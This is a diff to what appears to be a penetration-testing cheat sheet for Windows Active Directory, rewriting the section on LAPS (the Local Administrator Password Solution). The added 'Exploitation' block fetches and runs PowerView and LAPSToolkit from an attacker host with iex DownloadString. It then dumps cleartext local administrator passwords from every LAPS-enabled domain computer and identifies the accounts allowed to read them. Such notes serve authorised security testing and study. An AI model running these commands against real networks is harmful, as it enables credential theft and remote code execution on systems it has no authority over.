@@ -252,19 +252,38 @@ tasklist /SVC
 <summary>Local Administrator Password Solution (LAPS)</summary>
 
 * Secure and scalable way of remotely managing the local administrator password for domain-joined computers
-* 2 new attributes for computer object
-  * ms-mcs-AdmPwdExpirationTime
-    * Registers the expiration time of a password as directed through a group policy
-* ms-mcs-AdmPwd
-  * Contains the clear text password of the local administrator account
-  * Confidential, specific read permissions are required to access the content
+  * ms-mcs-AdmPwd
+    * Contains the clear text password of the local administrator account
 
+## Check if LAPS is installed Locally
+
+```powershell
+# Identify if installed to Program Files
+Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
+Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
+dir 'C:\Program Files\LAPS\CSE\'
+dir 'C:\Program Files (x86)\LAPS\CSE\'
+
+# Identify if installed by checking the AD Object
+Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'
 ```
-git clone https://github.com/leoloobeek/LAPSToolkit.git
-Import-Module .\LAPSToolkit.ps1
-Get-LAPSComputers --> show LAPS enabled computers && cleartext password if any
-Find-LAPSDelegatedGroups --> Get the groupname that can view LAPS passwords
-Get-NetGroupMember -GroupName "XXX" --> Find the accounts that can view LAPS passwords
+
+## Exploitation
+
+```powershell
+# PowerView
+iex (New-Object System.Net.WebClient).DownloadString('http://192.168.45.198/PowerView.ps1')
+Get-DomainComputer  | Select-Object 'dnshostname','ms-mcs-admpwd' | Where-Object {$_."ms-mcs-admpwd" -ne $null}
+
+# OR LAPSToolKit
+# git clone https://github.com/leoloobeek/LAPSToolkit.git
+iex (New-Object Net.Webclient).DownloadString("http://IP/LAPSToolkit.ps1")
+# Show LAPS enabled computers && cleartext password if any
+Get-LAPSComputers
+# Get the groupname that can view LAPS passwords
+Find-LAPSDelegatedGroups
+# Find the accounts that can view LAPS passwords
+Get-NetGroupMember -GroupName "XXX"
 ```
 
 </details>
